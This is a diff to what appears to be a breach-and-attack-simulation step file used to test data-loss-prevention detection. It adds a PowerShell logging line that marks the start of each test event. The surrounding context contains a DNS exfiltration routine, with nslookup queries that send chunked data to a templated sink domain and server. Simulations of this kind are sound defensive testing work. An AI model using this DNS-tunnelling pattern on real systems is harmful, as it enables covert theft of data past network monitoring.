@@ -85,6 +85,7 @@ steps:
       }
       $sent = 0
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
         for ($i = 0; $i -lt $chunks.Count; $i++) {
           $seq = "{0:D3}" -f ($i + 1)
@@ -143,6 +144,7 @@ steps:
       }
       $sent = 0
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
         for ($i = 0; $i -lt $chunks.Count; $i++) {
           $seq = "{0:D3}" -f ($i + 1)
@@ -201,6 +203,7 @@ steps:
       }
       $sent = 0
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
         for ($i = 0; $i -lt $chunks.Count; $i++) {
           $seq = "{0:D3}" -f ($i + 1)
@@ -259,6 +262,7 @@ steps:
       }
       $sent = 0
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         nslookup "000.$($chunks.Count).{{SINK_DNS_CAMPAIGN_ID}}.{{SINK_DNS_DOMAIN}}" {{SINK_DNS_SERVER}} 2>&1 | Out-Null
         for ($i = 0; $i -lt $chunks.Count; $i++) {
           $seq = "{0:D3}" -f ($i + 1)
